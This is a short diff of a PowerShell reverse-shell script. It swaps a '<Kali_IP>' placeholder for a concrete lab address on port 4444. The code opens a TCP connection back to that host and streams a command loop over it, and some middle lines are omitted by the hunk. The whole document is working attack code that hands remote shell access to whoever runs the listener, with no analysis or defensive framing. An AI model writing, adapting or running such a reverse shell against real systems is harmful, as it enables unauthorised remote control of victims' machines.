@@ -1,4 +1,4 @@
-$ip = "<Kali_IP>"; $port = 4444;
+$ip = "192.168.160.128"; $port = 4444;
 $c = New-Object System.Net.Sockets.TCPClient($ip, $port);
 $s = $c.GetStream();
 [byte[]]$b = 0..65535 | %{0};
@@ -11,4 +11,5 @@ $s.Write($sbbyte, 0, $sbbyte.Length);
 $s.Flush();
 }
 $c.Close();
+
 
